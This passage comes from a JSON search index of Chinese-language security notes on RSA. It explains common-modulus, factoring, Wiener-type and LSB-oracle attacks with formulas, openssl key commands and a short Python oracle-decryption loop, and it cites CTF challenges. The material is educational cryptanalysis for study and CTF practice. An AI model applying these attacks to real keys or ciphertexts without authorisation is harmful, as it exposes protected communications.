\u90a3\u9ebc\u6211\u5011\u5c31\u53ef\u4ee5\u5728\u4e0d\u5206\u89e3 n n \u7684\u60c5\u6cc1\u4e0b\uff0c\u9084\u539f m m","title":"Common Modulus Attack"},{"location":"security/crypto/asymmetric/rsa/common-modulus-attack/#_1","text":"e_1s_1 + e_2s_2 = gcd(e_1, e_2) = 1 e_1s_1 + e_2s_2 = gcd(e_1, e_2) = 1 \u6839\u64da\u8c9d\u7956\u5b9a\u7406 s_1, s_2 s_1, s_2 \u6709\u6574\u6578\u89e3 \u53ef\u4ee5\u7528\u64f4\u5c55\u6b50\u5e7e\u91cc\u5f97\u6c42\u51fa s_1, s_2 s_1, s_2 c_1^{s_1}c_2^{s_2} \\equiv m^{e_1s_1}m^{e_2s_2} = m^{e_1s_1 + e_2s_2} = m \\pmod{n} c_1^{s_1}c_2^{s_2} \\equiv m^{e_1s_1}m^{e_2s_2} = m^{e_1s_1 + e_2s_2} = m \\pmod{n}","title":"\u539f\u7406"},{"location":"security/crypto/asymmetric/rsa/factor-attack/","text":"Factor Attack \u7834\u89e3 RSA \u6700\u7c21\u55ae\u7684\u65b9\u5f0f\u5c31\u662f\u5206\u89e3 n = pq n = pq \u5206\u89e3 n n \u5f8c\u6211\u5011\u5c31\u53ef\u4ee5\u7167\u8457\u539f\u672c\u7522\u751f\u5bc6\u9470\u7684\u65b9\u5f0f\u627e\u56de \u79c1\u9470 \u4e0b\u9762\u5217\u5e7e\u500b\u5206\u89e3 n n \u7684\u6f14\u7b97\u6cd5 factoring algorithm notes CTF challenges Pollard's p - 1 Algorithm p - 1 \u662f smooth number SECCON 2017 Online CTF Williams's p + 1 Algorithm p + 1 \u662f smooth number Fermat's Factorization Method \\|p-q\\| \\|p-q\\| \u5f88\u5c0f Codegate CTF 2018 Preliminary - Miro","title":"Factor Attack"},{"location":"security/crypto/asymmetric/rsa/factor-attack/#factor-attack","text":"\u7834\u89e3 RSA \u6700\u7c21\u55ae\u7684\u65b9\u5f0f\u5c31\u662f\u5206\u89e3 n = pq n = pq \u5206\u89e3 n n \u5f8c\u6211\u5011\u5c31\u53ef\u4ee5\u7167\u8457\u539f\u672c\u7522\u751f\u5bc6\u9470\u7684\u65b9\u5f0f\u627e\u56de \u79c1\u9470 \u4e0b\u9762\u5217\u5e7e\u500b\u5206\u89e3 n n \u7684\u6f14\u7b97\u6cd5 factoring algorithm notes CTF challenges Pollard's p - 1 Algorithm p - 1 \u662f smooth number SECCON 2017 Online CTF Williams's p + 1 Algorithm p + 1 \u662f smooth number Fermat's Factorization Method \\|p-q\\| \\|p-q\\| \u5f88\u5c0f Codegate CTF 2018 Preliminary - Miro","title":"Factor Attack"},{"location":"security/crypto/asymmetric/rsa/factor-n-with-d/","text":"Factor n with d \u6709 d \u6211\u5011\u53ef\u4ee5\u5f88\u6709\u6548\u7387\u7684\u5206\u89e3 n ed - 1 = k\\varphi(n) ed - 1 = k\\varphi(n) \u6211\u5011\u77e5\u9053 \\varphi(n) = (p - 1) (q - 1) \\varphi(n) = (p - 1) (q - 1) \u662f\u5076\u6578 k\\varphi(n) = 2^tr k\\varphi(n) = 2^tr for some t, r t, r \u9078\u4e00\u500b g = \\{2, ..., n - 1\\} g = \\{2, ..., n - 1\\} \u8003\u616e\u4ee5\u4e0b\u5e8f\u5217 x = g^{2^{t-1}r}, g^{2^{t-2}r}, ... g^{r} \\mod n x = g^{2^{t-1}r}, g^{2^{t-2}r}, ... g^{r} \\mod n \u8a08\u7b97 gcd(x - 1, n) gcd(x - 1, n) \uff0c\u7576 gcd \u4e0d\u7b49\u65bc 1 \u6211\u5011\u5c31\u627e\u5230 n n \u7684\u56e0\u6578 \u70ba\u4ec0\u9ebc\u8003\u616e\u8a72\u5e8f\u5217? g^{ed - 1} \\equiv g^{k\\varphi(n)} \\equiv g^{2^tr} \\equiv 1 \\pmod{n} g^{ed - 1} \\equiv g^{k\\varphi(n)} \\equiv g^{2^tr} \\equiv 1 \\pmod{n} g^{2^{t-1}r} \\mod{n} g^{2^{t-1}r} \\mod{n} \u70ba 1 \u5728\u6a21 n \u4e0b\u7684\u6a21\u958b\u65b9\u6839\uff0c\u53ef\u80fd\u662f\u56db\u7d44\u89e3 \\pm 1, \\pm x \\pm 1, \\pm x \u7684\u5176\u4e2d\u4e00\u7a2e \u7576\u4ed6\u7b49\u65bc \\pm x \\pm x \u6642\uff0c x \\equiv 1 \\pmod{p}, x \\equiv -1 \\pmod{q} x \\equiv 1 \\pmod{p}, x \\equiv -1 \\pmod{q} \u6216\u8005 x \\equiv -1 \\pmod{p}, x \\equiv 1 \\pmod{q} x \\equiv -1 \\pmod{p}, x \\equiv 1 \\pmod{q} \u90fd\u6703\u5f97\u5230 gcd(x - 1, n) \\ne 1 gcd(x - 1, n) \\ne 1 \u76f8\u95dc\u8cc7\u6e90 https://www.di-mgt.com.au/rsa_factorize_n.html","title":"Factor n with d"},{"location":"security/crypto/asymmetric/rsa/factor-n-with-d/#factor-n-with-d","text":"\u6709 d \u6211\u5011\u53ef\u4ee5\u5f88\u6709\u6548\u7387\u7684\u5206\u89e3 n ed - 1 = k\\varphi(n) ed - 1 = k\\varphi(n) \u6211\u5011\u77e5\u9053 \\varphi(n) = (p - 1) (q - 1) \\varphi(n) = (p - 1) (q - 1) \u662f\u5076\u6578 k\\varphi(n) = 2^tr k\\varphi(n) = 2^tr for some t, r t, r \u9078\u4e00\u500b g = \\{2, ..., n - 1\\} g = \\{2, ..., n - 1\\} \u8003\u616e\u4ee5\u4e0b\u5e8f\u5217 x = g^{2^{t-1}r}, g^{2^{t-2}r}, ... g^{r} \\mod n x = g^{2^{t-1}r}, g^{2^{t-2}r}, ... g^{r} \\mod n \u8a08\u7b97 gcd(x - 1, n) gcd(x - 1, n) \uff0c\u7576 gcd \u4e0d\u7b49\u65bc 1 \u6211\u5011\u5c31\u627e\u5230 n n \u7684\u56e0\u6578","title":"Factor n with d"},{"location":"security/crypto/asymmetric/rsa/factor-n-with-d/#_1","text":"g^{ed - 1} \\equiv g^{k\\varphi(n)} \\equiv g^{2^tr} \\equiv 1 \\pmod{n} g^{ed - 1} \\equiv g^{k\\varphi(n)} \\equiv g^{2^tr} \\equiv 1 \\pmod{n} g^{2^{t-1}r} \\mod{n} g^{2^{t-1}r} \\mod{n} \u70ba 1 \u5728\u6a21 n \u4e0b\u7684\u6a21\u958b\u65b9\u6839\uff0c\u53ef\u80fd\u662f\u56db\u7d44\u89e3 \\pm 1, \\pm x \\pm 1, \\pm x \u7684\u5176\u4e2d\u4e00\u7a2e \u7576\u4ed6\u7b49\u65bc \\pm x \\pm x \u6642\uff0c x \\equiv 1 \\pmod{p}, x \\equiv -1 \\pmod{q} x \\equiv 1 \\pmod{p}, x \\equiv -1 \\pmod{q} \u6216\u8005 x \\equiv -1 \\pmod{p}, x \\equiv 1 \\pmod{q} x \\equiv -1 \\pmod{p}, x \\equiv 1 \\pmod{q} \u90fd\u6703\u5f97\u5230 gcd(x - 1, n) \\ne 1 gcd(x - 1, n) \\ne 1","title":"\u70ba\u4ec0\u9ebc\u8003\u616e\u8a72\u5e8f\u5217?"},{"location":"security/crypto/asymmetric/rsa/factor-n-with-d/#_2","text":"https://www.di-mgt.com.au/rsa_factorize_n.html","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/asymmetric/rsa/implementation/","text":"Implementation DER \u683c\u5f0f \u9019\u500b\u683c\u5f0f\u662f\u7531 type-length-value \u7684 tuple \u7d44\u6210 myQuestion FooQuestion ::= { trackingNumber 5, question \"Anybody there?\" } 30 -- \u6a19\u7c64\u8aaa\u660e SEQUENCE 13 -- \u9577\u5ea6 02 -- \u6a19\u7c64\u8aaa\u660e INTEGER 01 -- \u9577\u5ea6 05 -- value 16 -- \u6a19\u7c64\u8aaa\u660e IA5String 0e -- \u9577\u5ea6 41 6e 79 62 6f 64 79 20 74 68 65 72 65 3f -- value (\"Anybody there?\" in ASCII) \u771f\u5be6\u7684\u8cc7\u6599 : 30 13 02 01 05 16 0e 41 6e 79 62 6f 64 79 20 74 68 65 72 65 3f PEM \u683c\u5f0f \u5c07 DER \u683c\u5f0f\u505a base64 \u7de8\u78bc \u7522\u751f\u79c1\u9470 \u4f7f\u7528 openssl openssl genrsa -out private.pem 4096 \u7522\u751f\u516c\u9470 \u5f9e\u79c1\u9470\u4e2d\u53d6\u51fa\u516c\u9470\u7684\u90e8\u4efd \u4f7f\u7528 openssl openssl rsa -in private.pem -pubout > public.pem \u89e3\u6790\u516c\u9470 \u4f7f\u7528 pycrypto \u5957\u4ef6 from Crypto.PublicKey import RSA public = RSA . importKey ( open ( 'public.pem' ) . read ()) \u4f7f\u7528 openssl openssl rsa -pubin -text -noout < public.pem \u89e3\u6790\u79c1\u9470 \u4f7f\u7528 pycrypto \u5957\u4ef6 from Crypto.PublicKey import RSA private = RSA . importKey ( open ( 'private.pem' ) . read ()) \u4f7f\u7528 openssl openssl rsa -in private.pem -text -noout \u52a0\u5bc6 \u4f7f\u7528 openssl openssl rsautl -encrypt -pubin -inkey public.pem -in data -out data.enc \u89e3\u5bc6 \u4f7f\u7528 openssl openssl rsautl -decrypt -inkey private.pem -in data.enc -out data","title":"\u5be6\u505a"},{"location":"security/crypto/asymmetric/rsa/implementation/#implementation","text":"","title":"Implementation"},{"location":"security/crypto/asymmetric/rsa/implementation/#der","text":"\u9019\u500b\u683c\u5f0f\u662f\u7531 type-length-value \u7684 tuple \u7d44\u6210 myQuestion FooQuestion ::= { trackingNumber 5, question \"Anybody there?\" } 30 -- \u6a19\u7c64\u8aaa\u660e SEQUENCE 13 -- \u9577\u5ea6 02 -- \u6a19\u7c64\u8aaa\u660e INTEGER 01 -- \u9577\u5ea6 05 -- value 16 -- \u6a19\u7c64\u8aaa\u660e IA5String 0e -- \u9577\u5ea6 41 6e 79 62 6f 64 79 20 74 68 65 72 65 3f -- value (\"Anybody there?\" in ASCII) \u771f\u5be6\u7684\u8cc7\u6599 : 30 13 02 01 05 16 0e 41 6e 79 62 6f 64 79 20 74 68 65 72 65 3f","title":"DER \u683c\u5f0f"},{"location":"security/crypto/asymmetric/rsa/implementation/#pem","text":"\u5c07 DER \u683c\u5f0f\u505a base64 \u7de8\u78bc","title":"PEM \u683c\u5f0f"},{"location":"security/crypto/asymmetric/rsa/implementation/#_1","text":"\u4f7f\u7528 openssl openssl genrsa -out private.pem 4096","title":"\u7522\u751f\u79c1\u9470"},{"location":"security/crypto/asymmetric/rsa/implementation/#_2","text":"\u5f9e\u79c1\u9470\u4e2d\u53d6\u51fa\u516c\u9470\u7684\u90e8\u4efd \u4f7f\u7528 openssl openssl rsa -in private.pem -pubout > public.pem","title":"\u7522\u751f\u516c\u9470"},{"location":"security/crypto/asymmetric/rsa/implementation/#_3","text":"\u4f7f\u7528 pycrypto \u5957\u4ef6 from Crypto.PublicKey import RSA public = RSA . importKey ( open ( 'public.pem' ) . read ()) \u4f7f\u7528 openssl openssl rsa -pubin -text -noout < public.pem","title":"\u89e3\u6790\u516c\u9470"},{"location":"security/crypto/asymmetric/rsa/implementation/#_4","text":"\u4f7f\u7528 pycrypto \u5957\u4ef6 from Crypto.PublicKey import RSA private = RSA . importKey ( open ( 'private.pem' ) . read ()) \u4f7f\u7528 openssl openssl rsa -in private.pem -text -noout","title":"\u89e3\u6790\u79c1\u9470"},{"location":"security/crypto/asymmetric/rsa/implementation/#_5","text":"\u4f7f\u7528 openssl openssl rsautl -encrypt -pubin -inkey public.pem -in data -out data.enc","title":"\u52a0\u5bc6"},{"location":"security/crypto/asymmetric/rsa/implementation/#_6","text":"\u4f7f\u7528 openssl openssl rsautl -decrypt -inkey private.pem -in data.enc -out data","title":"\u89e3\u5bc6"},{"location":"security/crypto/asymmetric/rsa/introduction/","text":"Introduction to RSA \u7522\u751f\u5bc6\u9470 \u9078\u5169\u500b\u8cea\u6578 p p and q q ( p \\ne q p \\ne q ) n = p \\times q n = p \\times q r = \\varphi(n) = \\varphi(p) \\times \\varphi(q) = (p-1)(q-1) r = \\varphi(n) = \\varphi(p) \\times \\varphi(q) = (p-1)(q-1) \u9078\u4e00\u500b e e \u6eff\u8db3 e < r e < r and gcd(e,r) = 1 gcd(e,r) = 1 d d \u662f e e \u5c0d r r \u7684\u6a21\u53cd\u5143\u7d20\uff0c\u4e5f\u5c31\u662f ed \\equiv 1 \\pmod{r} ed \\equiv 1 \\pmod{r} (n,e) (n,e) \u662f\u516c\u9470 (n,d) (n,d) \u662f\u79c1\u9470 \u52a0\u89e3\u5bc6 Alice \u5229\u7528\u4e0a\u9762\u7684\u516c\u5f0f\u7522\u751f\u516c\u9470 (n_1, e_1) (n_1, e_1) \u548c\u79c1\u9470 (n_1, d_1) (n_1, d_1) Bob \u5229\u7528\u4e0a\u9762\u7684\u516c\u5f0f\u7522\u751f\u516c\u9470 (n_2, e_2) (n_2, e_2) \u548c\u79c1\u9470 (n_2, d_2) (n_2, d_2) Alice \u8ddf Bob \u4ea4\u63db\u516c\u9470 \u7576 Alice \u8981\u50b3\u660e\u6587 m_1 m_1 \u7d66 Bob\uff0c m_1^{e_2} \\equiv c_1 \\pmod{n_2} m_1^{e_2} \\equiv c_1 \\pmod{n_2} \uff0c\u5c07 c_1 c_1 \u50b3\u7d66 Bob Bob \u63a5\u5230\u5bc6\u6587 c_1 c_1 \u5f8c\uff0c c_1^{d_2} \\equiv m_1^{e_2d_2} \\equiv m_1 \\pmod{n_2} c_1^{d_2} \\equiv m_1^{e_2d_2} \\equiv m_1 \\pmod{n_2} \uff0c\u6210\u529f\u89e3\u56de m_1 m_1 \u7576 Bob \u8981\u50b3\u660e\u6587 m_2 m_2 \u7d66 Alice\uff0c m_2^{e_1} \\equiv c_2 \\pmod{n_1} m_2^{e_1} \\equiv c_2 \\pmod{n_1} \uff0c\u5c07 c_2 c_2 \u50b3\u7d66 Alice Alice \u63a5\u5230\u5bc6\u6587 c_2 c_2 \u5f8c\uff0c c_2^{d_1} \\equiv m_2^{e_1d_1} \\equiv m_2 \\pmod{n_1} c_2^{d_1} \\equiv m_2^{e_1d_1} \\equiv m_2 \\pmod{n_1} \uff0c\u6210\u529f\u89e3\u56de m_2 m_2 \u8b49\u660e\u52a0\u89e3\u5bc6\u7684\u6b63\u78ba\u6027 ed \\equiv 1 \\pmod{r} ed \\equiv 1 \\pmod{r} ed = 1+kr = 1+k\\varphi(n) ed = 1+kr = 1+k\\varphi(n) for some k k m^{ed} = m^{1+k\\varphi(n)} = m(m^{\\varphi(n)})^{k} \\equiv m(1)^k = m \\pmod{n} m^{ed} = m^{1+k\\varphi(n)} = m(m^{\\varphi(n)})^{k} \\equiv m(1)^k = m \\pmod{n} \u6ce8\u8a18 Stack Overflow Discussion \u53ef\u80fd\u6703\u770b\u5230\u6709\u4e9b\u4eba\u7684 r = \\lambda(n) = lcm(p - 1, q - 1) r = \\lambda(n) = lcm(p - 1, q - 1) \uff0c \\lambda \\lambda \u662f Carmichael Function \u9019\u4e5f\u662f\u5c0d\u7684\u4e0d\u5f71\u97ff\u5f8c\u9762\u7684\u6d41\u7a0b \u4e26\u4e14 \\lambda(n) \\lambda(n) \u53ef\u4ee5\u6574\u9664 \\varphi(n) \\varphi(n) \u7fd2\u6163 n n : \u6a21\u6578 ( modulus ) e e : \u516c\u9470\u6307\u6578 ( public exponent ) d d : \u79c1\u9470\u6307\u6578 ( private exponent) \u653b\u64ca\u5c64\u9762 \u5047\u8a2d\u6211\u5011\u53ef\u4ee5\u5c0d n n \u505a\u8cea\u56e0\u6578\u5206\u89e3\u51fa p, q p, q \uff0c\u90a3\u6211\u5011\u5c31\u53ef\u4ee5\u7167\u8457\u7522\u751f\u516c\u79c1\u9470\u7684\u6d41\u7a0b\u9084\u539f d d \uff0c\u9032\u800c\u89e3\u958b\u5bc6\u6587 \u5047\u8a2d\u6211\u5011\u53ef\u4ee5\u77e5\u9053 d d \uff0c\u90a3\u6211\u5011\u4e5f\u53ef\u4ee5\u9032\u800c\u5c0d n n \u505a\u8cea\u56e0\u6578\u5206\u89e3\uff0c\u53ef\u4ee5\u53c3\u8003\u9019\u500b\u5be6\u4f5c rsatool - factor_modulus \u5404\u7a2e\u653b\u64ca\u624b\u6cd5 n, p, q n, p, q e, d e, d m m \u8a3b\u89e3 \u653b\u64ca\u624b\u6cd5 p - 1 p - 1 \u662f smooth number \u5206\u89e3 n n Pollard's p - 1 Algorithm p + 1 p + 1 \u662f smooth number \u5206\u89e3 n n Williams's p + 1 Algorithm \\|p - q\\| \\|p - q\\| \u5f88\u5c0f \u5206\u89e3 n n Fermat's Factorization Method d d \u5f88\u5c0f \u5206\u89e3 n n Wiener's Attack d d \u5f88\u5c0f \u5206\u89e3 n n Boneh and Durfee Attack gcd(n_1, ..., n_k) \\ne 1 gcd(n_1, ..., n_k) \\ne 1 \u591a\u500b\u5bc6\u6587 Common Factor Attack n_1 = n_2 n_1 = n_2 gcd(e_1, e_2) = 1 gcd(e_1, e_2) = 1 m_1 = m_2 m_1 = m_2 \u5169\u500b\u5bc6\u6587 Common Modulus Attack n_1 \\ne \\cdots \\ne n_k n_1 \\ne \\cdots \\ne n_k e_1 = \\cdots = e_k e_1 = \\cdots = e_k \u4e14 k \\ge e k \\ge e m_1 = \\cdots = m_k m_1 = \\cdots = m_k \u591a\u500b\u5bc6\u6587 H\u00e5stad's Broadcast Attack n_1 = n_2 n_1 = n_2 e_1 = e_2 e_1 = e_2 m_1 = f(m_2) m_1 = f(m_2) \u5169\u500b\u5bc6\u6587 Franklin-Reiter Related Message Attack n_1 = n_2 n_1 = n_2 e_1 = e_2 e_1 = e_2 m_1, m_2 m_1, m_2 \u662f\u540c\u4e00\u660e\u6587\u4e0d\u540c padding \u5169\u500b\u5bc6\u6587 Coppersmith Short-Pad Attack \u76f8\u95dc\u8cc7\u6e90 Twenty Years of Attacks on the RSA Cryptosystem","title":"Introduction to RSA"},{"location":"security/crypto/asymmetric/rsa/introduction/#introduction-to-rsa","text":"","title":"Introduction to RSA"},{"location":"security/crypto/asymmetric/rsa/introduction/#_1","text":"\u9078\u5169\u500b\u8cea\u6578 p p and q q ( p \\ne q p \\ne q ) n = p \\times q n = p \\times q r = \\varphi(n) = \\varphi(p) \\times \\varphi(q) = (p-1)(q-1) r = \\varphi(n) = \\varphi(p) \\times \\varphi(q) = (p-1)(q-1) \u9078\u4e00\u500b e e \u6eff\u8db3 e < r e < r and gcd(e,r) = 1 gcd(e,r) = 1 d d \u662f e e \u5c0d r r \u7684\u6a21\u53cd\u5143\u7d20\uff0c\u4e5f\u5c31\u662f ed \\equiv 1 \\pmod{r} ed \\equiv 1 \\pmod{r} (n,e) (n,e) \u662f\u516c\u9470 (n,d) (n,d) \u662f\u79c1\u9470","title":"\u7522\u751f\u5bc6\u9470"},{"location":"security/crypto/asymmetric/rsa/introduction/#_2","text":"Alice \u5229\u7528\u4e0a\u9762\u7684\u516c\u5f0f\u7522\u751f\u516c\u9470 (n_1, e_1) (n_1, e_1) \u548c\u79c1\u9470 (n_1, d_1) (n_1, d_1) Bob \u5229\u7528\u4e0a\u9762\u7684\u516c\u5f0f\u7522\u751f\u516c\u9470 (n_2, e_2) (n_2, e_2) \u548c\u79c1\u9470 (n_2, d_2) (n_2, d_2) Alice \u8ddf Bob \u4ea4\u63db\u516c\u9470 \u7576 Alice \u8981\u50b3\u660e\u6587 m_1 m_1 \u7d66 Bob\uff0c m_1^{e_2} \\equiv c_1 \\pmod{n_2} m_1^{e_2} \\equiv c_1 \\pmod{n_2} \uff0c\u5c07 c_1 c_1 \u50b3\u7d66 Bob Bob \u63a5\u5230\u5bc6\u6587 c_1 c_1 \u5f8c\uff0c c_1^{d_2} \\equiv m_1^{e_2d_2} \\equiv m_1 \\pmod{n_2} c_1^{d_2} \\equiv m_1^{e_2d_2} \\equiv m_1 \\pmod{n_2} \uff0c\u6210\u529f\u89e3\u56de m_1 m_1 \u7576 Bob \u8981\u50b3\u660e\u6587 m_2 m_2 \u7d66 Alice\uff0c m_2^{e_1} \\equiv c_2 \\pmod{n_1} m_2^{e_1} \\equiv c_2 \\pmod{n_1} \uff0c\u5c07 c_2 c_2 \u50b3\u7d66 Alice Alice \u63a5\u5230\u5bc6\u6587 c_2 c_2 \u5f8c\uff0c c_2^{d_1} \\equiv m_2^{e_1d_1} \\equiv m_2 \\pmod{n_1} c_2^{d_1} \\equiv m_2^{e_1d_1} \\equiv m_2 \\pmod{n_1} \uff0c\u6210\u529f\u89e3\u56de m_2 m_2","title":"\u52a0\u89e3\u5bc6"},{"location":"security/crypto/asymmetric/rsa/introduction/#_3","text":"ed \\equiv 1 \\pmod{r} ed \\equiv 1 \\pmod{r} ed = 1+kr = 1+k\\varphi(n) ed = 1+kr = 1+k\\varphi(n) for some k k m^{ed} = m^{1+k\\varphi(n)} = m(m^{\\varphi(n)})^{k} \\equiv m(1)^k = m \\pmod{n} m^{ed} = m^{1+k\\varphi(n)} = m(m^{\\varphi(n)})^{k} \\equiv m(1)^k = m \\pmod{n}","title":"\u8b49\u660e\u52a0\u89e3\u5bc6\u7684\u6b63\u78ba\u6027"},{"location":"security/crypto/asymmetric/rsa/introduction/#_4","text":"Stack Overflow Discussion \u53ef\u80fd\u6703\u770b\u5230\u6709\u4e9b\u4eba\u7684 r = \\lambda(n) = lcm(p - 1, q - 1) r = \\lambda(n) = lcm(p - 1, q - 1) \uff0c \\lambda \\lambda \u662f Carmichael Function \u9019\u4e5f\u662f\u5c0d\u7684\u4e0d\u5f71\u97ff\u5f8c\u9762\u7684\u6d41\u7a0b \u4e26\u4e14 \\lambda(n) \\lambda(n) \u53ef\u4ee5\u6574\u9664 \\varphi(n) \\varphi(n)","title":"\u6ce8\u8a18"},{"location":"security/crypto/asymmetric/rsa/introduction/#_5","text":"n n : \u6a21\u6578 ( modulus ) e e : \u516c\u9470\u6307\u6578 ( public exponent ) d d : \u79c1\u9470\u6307\u6578 ( private exponent)","title":"\u7fd2\u6163"},{"location":"security/crypto/asymmetric/rsa/introduction/#_6","text":"\u5047\u8a2d\u6211\u5011\u53ef\u4ee5\u5c0d n n \u505a\u8cea\u56e0\u6578\u5206\u89e3\u51fa p, q p, q \uff0c\u90a3\u6211\u5011\u5c31\u53ef\u4ee5\u7167\u8457\u7522\u751f\u516c\u79c1\u9470\u7684\u6d41\u7a0b\u9084\u539f d d \uff0c\u9032\u800c\u89e3\u958b\u5bc6\u6587 \u5047\u8a2d\u6211\u5011\u53ef\u4ee5\u77e5\u9053 d d \uff0c\u90a3\u6211\u5011\u4e5f\u53ef\u4ee5\u9032\u800c\u5c0d n n \u505a\u8cea\u56e0\u6578\u5206\u89e3\uff0c\u53ef\u4ee5\u53c3\u8003\u9019\u500b\u5be6\u4f5c rsatool - factor_modulus","title":"\u653b\u64ca\u5c64\u9762"},{"location":"security/crypto/asymmetric/rsa/introduction/#_7","text":"n, p, q n, p, q e, d e, d m m \u8a3b\u89e3 \u653b\u64ca\u624b\u6cd5 p - 1 p - 1 \u662f smooth number \u5206\u89e3 n n Pollard's p - 1 Algorithm p + 1 p + 1 \u662f smooth number \u5206\u89e3 n n Williams's p + 1 Algorithm \\|p - q\\| \\|p - q\\| \u5f88\u5c0f \u5206\u89e3 n n Fermat's Factorization Method d d \u5f88\u5c0f \u5206\u89e3 n n Wiener's Attack d d \u5f88\u5c0f \u5206\u89e3 n n Boneh and Durfee Attack gcd(n_1, ..., n_k) \\ne 1 gcd(n_1, ..., n_k) \\ne 1 \u591a\u500b\u5bc6\u6587 Common Factor Attack n_1 = n_2 n_1 = n_2 gcd(e_1, e_2) = 1 gcd(e_1, e_2) = 1 m_1 = m_2 m_1 = m_2 \u5169\u500b\u5bc6\u6587 Common Modulus Attack n_1 \\ne \\cdots \\ne n_k n_1 \\ne \\cdots \\ne n_k e_1 = \\cdots = e_k e_1 = \\cdots = e_k \u4e14 k \\ge e k \\ge e m_1 = \\cdots = m_k m_1 = \\cdots = m_k \u591a\u500b\u5bc6\u6587 H\u00e5stad's Broadcast Attack n_1 = n_2 n_1 = n_2 e_1 = e_2 e_1 = e_2 m_1 = f(m_2) m_1 = f(m_2) \u5169\u500b\u5bc6\u6587 Franklin-Reiter Related Message Attack n_1 = n_2 n_1 = n_2 e_1 = e_2 e_1 = e_2 m_1, m_2 m_1, m_2 \u662f\u540c\u4e00\u660e\u6587\u4e0d\u540c padding \u5169\u500b\u5bc6\u6587 Coppersmith Short-Pad Attack","title":"\u5404\u7a2e\u653b\u64ca\u624b\u6cd5"},{"location":"security/crypto/asymmetric/rsa/introduction/#_8","text":"Twenty Years of Attacks on the RSA Cryptosystem","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/asymmetric/rsa/lsb-oracle/","text":"LSB Oracle Attack \u60c5\u5883 \u6709\u4e00\u500b server \u6703\u5e6b\u6211\u5011\u505a RSA \u89e3\u5bc6\u4e26\u628a\u7d50\u679c\u7684\u6700\u5f8c\u4e00\u500b bit \u544a\u8a34\u4f60 ( \u5947\u5076 ) \u4e5f\u5c31\u662f\u7d66 server \u5bc6\u6587 c c \u6703\u5f97\u5230 LSB(c^d \\text{ mod } n) LSB(c^d \\text{ mod } n) \u653b\u64ca\u624b\u6cd5 \u6211\u5011\u7684\u76ee\u6a19\u662f\u89e3\u51fa\u88ab rsa \u52a0\u5bc6\u7684\u5bc6\u6587 c c \u5047\u8a2d\u660e\u6587 m \\in [0, \\frac{n}{2}) m \\in [0, \\frac{n}{2}) \uff0c\u90a3 2m \\in [0, n) 2m \\in [0, n) \uff0c\u4e14 2m \\text{ mod } n = 2m 2m \\text{ mod } n = 2m \u662f\u5076\u6578 \u5047\u8a2d\u660e\u6587 m \\in [\\frac{n}{2}, n) m \\in [\\frac{n}{2}, n) \uff0c\u90a3 2m \\in [n, 2n) 2m \\in [n, 2n) \uff0c\u4e14 2m \\text{ mod } n = 2m - n 2m \\text{ mod } n = 2m - n \u662f\u5947\u6578 ( n n \u662f\u5947\u6578 ) \u7d66 server 2^ec 2^ec \u4e26\u5f97\u5230 LSB(2m \\text{ mod } n) LSB(2m \\text{ mod } n) \u5c31\u53ef\u4ee5\u5224\u65b7 m m \u662f\u843d\u54ea\u500b\u7bc4\u570d \u5df2\u77e5\u660e\u6587 m \\in [0, \\frac{n}{2}) m \\in [0, \\frac{n}{2}) \u5047\u8a2d\u660e\u6587 m \\in [0, \\frac{n}{4}) m \\in [0, \\frac{n}{4}) \uff0c\u90a3 4m \\in [0, n) 4m \\in [0, n) \uff0c\u4e14 4m \\text{ mod } n = 4m 4m \\text{ mod } n = 4m \u662f\u5076\u6578 \u5047\u8a2d\u660e\u6587 m \\in [\\frac{n}{4}, \\frac{2n}{4}) m \\in [\\frac{n}{4}, \\frac{2n}{4}) \uff0c\u90a3 4m \\in [n, 2n) 4m \\in [n, 2n) \uff0c\u4e14 4m \\text{ mod } n = 4m - n 4m \\text{ mod } n = 4m - n \u662f\u5947\u6578 \u5df2\u77e5\u660e\u6587 m \\in [\\frac{n}{2}, n) m \\in [\\frac{n}{2}, n) \u5047\u8a2d\u660e\u6587 m \\in [\\frac{2n}{4}, \\frac{3n}{4}) m \\in [\\frac{2n}{4}, \\frac{3n}{4}) \uff0c\u90a3 4m \\in [2n, 3n) 4m \\in [2n, 3n) \uff0c\u4e14 4m \\text{ mod } n = 4m - 2n 4m \\text{ mod } n = 4m - 2n \u662f\u5076\u6578 \u5047\u8a2d\u660e\u6587 m \\in [\\frac{3n}{4}, n) m \\in [\\frac{3n}{4}, n) \uff0c\u90a3 4m \\in [3n, 4n) 4m \\in [3n, 4n) \uff0c\u4e14 4m \\text{ mod } n = 4m - 3n 4m \\text{ mod } n = 4m - 3n \u662f\u5947\u6578 \u7d66 server 4^ec 4^ec \u4e26\u5f97\u5230 LSB(4m \\text{ mod } n) LSB(4m \\text{ mod } n) \u5c31\u53ef\u4ee5\u5224\u65b7 m m \u662f\u843d\u54ea\u500b\u7bc4\u570d \u63a5\u4e0b\u4f86\u4e5f\u662f\u505a\u4e00\u6a23\u7684\u4e8b\u60c5\uff0c\u4e00\u6b65\u6b65\u628a\u7bc4\u570d\u7e2e\u5c0f\u4e00\u534a\uff0c\u5c31\u662f\u4e8c\u5206\u641c\uff0c\u7e3d\u5171\u9700\u8981 \\text{log}_2(n) \\text{log}_2(n) \u500b\u6b65\u9a5f \u7a0b\u5f0f\u78bc ( python ) L = 0 H = n t = pow ( 2 , e , n ) for _ in range ( n . bit_length ()): c = ( t * c ) % n if oracle ( c ) == 0 : H = ( L + H ) // 2 else : L = ( L + H ) // 2 m = L # plain text CTF \u984c\u76ee Google CTF 2018 Quals - PERFECT SECRECY \u76f8\u95dc\u8cc7\u6599 http://blog.chrstm.com/2018/04/18/RSA_LSB_Oracle_Attack/","title":"LSB Oracle Attack"},{"location":"security/crypto/asymmetric/rsa/lsb-oracle/#lsb-oracle-attack","text":"","title":"LSB Oracle Attack"},{"location":"security/crypto/asymmetric/rsa/lsb-oracle/#_1","text":"\u6709\u4e00\u500b server \u6703\u5e6b\u6211\u5011\u505a RSA \u89e3\u5bc6\u4e26\u628a\u7d50\u679c\u7684\u6700\u5f8c\u4e00\u500b bit \u544a\u8a34\u4f60 ( \u5947\u5076 ) \u4e5f\u5c31\u662f\u7d66 server \u5bc6\u6587 c c \u6703\u5f97\u5230 LSB(c^d \\text{ mod } n) LSB(c^d \\text{ mod } n)","title":"\u60c5\u5883"},{"location":"security/crypto/asymmetric/rsa/lsb-oracle/#_2","text":"\u6211\u5011\u7684\u76ee\u6a19\u662f\u89e3\u51fa\u88ab rsa \u52a0\u5bc6\u7684\u5bc6\u6587 c c \u5047\u8a2d\u660e\u6587 m \\in [0, \\frac{n}{2}) m \\in 